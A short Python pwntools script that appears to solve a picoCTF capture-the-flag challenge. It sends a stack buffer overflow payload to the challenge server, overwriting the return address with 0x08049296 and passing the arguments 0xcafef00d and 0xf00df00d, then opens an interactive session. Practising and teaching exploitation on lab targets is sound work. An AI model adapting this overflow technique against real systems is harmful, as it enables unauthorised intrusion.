from pwn import *

context.binary = ELF('./vuln')

payload = "A"*112
payload = payload.encode() + p32(0x08049296) + ("A"*4).encode() + p32(0xcafef00d) +  p32(0xf00df00d)

p = remote("saturn.picoctf.net", 64868)
p.recvuntil(b"Please enter your string:")
p.sendline(payload)
p.interactive()
